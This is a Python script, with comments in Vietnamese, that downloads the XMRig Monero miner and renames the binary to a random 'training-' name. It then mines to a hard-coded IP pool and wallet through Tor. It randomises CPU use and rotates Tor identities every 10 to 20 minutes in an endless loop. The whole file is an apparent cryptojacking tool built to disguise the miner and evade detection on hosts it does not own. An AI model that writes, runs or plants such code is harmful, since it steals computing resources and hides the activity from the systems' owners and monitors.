import subprocess
import secrets
import shutil
import os
import time
import random
from pathlib import Path
from stem import Signal
from stem.control import Controller

# Constants
VERSION = "6.21.0"
WORK_DIR = Path.home() / "work"
XMRIg_DIR = WORK_DIR / f"xmrig-{VERSION}"
POOL = "47.238.48.153:8080"
USERNAME = "44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao"
ALGO = "rx/0"
DONATE = "1"
TOR_PORT = 9051

# Helper function to run shell commands
def run_command(command):
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running command {command}: {e}")
        return False
    return True

# Download XMRig
def download_xmrig():
    url = f"https://github.com/xmrig/xmrig/releases/download/v{VERSION}/xmrig-{VERSION}-linux-x64.tar.gz"
    return run_command(["wget", url, "-P", str(WORK_DIR)])

# Extract XMRig
def extract_xmrig():
    tar_file = WORK_DIR / f"xmrig-{VERSION}-linux-x64.tar.gz"
    return run_command(["tar", "-xvzf", str(tar_file), "-C", str(WORK_DIR)])

# Rename XMRig to a random name
def rename_xmrig():
    xmrig_path = XMRIg_DIR / "xmrig"
    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
    new_path = WORK_DIR / random_name
    shutil.move(str(xmrig_path), str(new_path))
    return new_path

# Set executable permissions for XMRig
def set_permissions(xmrig_path):
    os.chmod(str(xmrig_path), 0o755)

# Run XMRig through Tor with random CPU usage
def run_xmrig(xmrig_path):
    cpu_hint = random.randint(70, 90)
    xmrig_cmd = [
        "torsocks", str(xmrig_path),
        "--donate-level", DONATE,
        "-o", POOL,
        "-u", USERNAME,
        "-a", ALGO,
        "--no-huge-pages",
        "-k", "--tls",
        f"--cpu-max-threads-hint={cpu_hint}"
    ]

    print(f"Running XMRig with {cpu_hint}% CPU.")
    return subprocess.Popen(xmrig_cmd)

# Stop XMRig
def stop_xmrig(xmrig_process):
    xmrig_process.terminate()
    xmrig_process.wait()

# Renew IP via Tor by sending NEWNYM signal
def renew_connection():
    try:
        with Controller.from_port(port=TOR_PORT) as controller:  # Kết nối tới Tor Control Port
            controller.authenticate()  # Xác thực với Tor (mặc định không cần mật khẩu nếu chưa cấu hình)
            controller.signal(Signal.NEWNYM)  # Gửi lệnh NEWNYM để đổi IP
            print("Đã yêu cầu Tor thay đổi IP (NEWNYM).")
    except Exception as e:
        print(f"Lỗi khi cố gắng đổi IP qua Tor: {e}")

# Main function
def main():
    WORK_DIR.mkdir(parents=True, exist_ok=True)

    if download_xmrig() and extract_xmrig():
        xmrig_path = rename_xmrig()
        set_permissions(xmrig_path)

        while True:
            # Chạy XMRig với CPU sử dụng ngẫu nhiên từ 70 đến 90%
            xmrig_process = run_xmrig(xmrig_path)

            # Ngủ trong khoảng thời gian ngẫu nhiên từ 10 đến 20 phút
            sleep_time = random.randint(600, 1200)  # Ngẫu nhiên từ 600s (10 phút) đến 1200s (20 phút)
            print(f"Chờ {sleep_time // 60} phút trước khi đổi IP...")
            time.sleep(sleep_time)

            # Đổi IP và khởi động lại XMRig với tỷ lệ CPU ngẫu nhiên mới
            renew_connection()  # Yêu cầu Tor đổi IP
            stop_xmrig(xmrig_process)

if __name__ == "__main__":
    main()
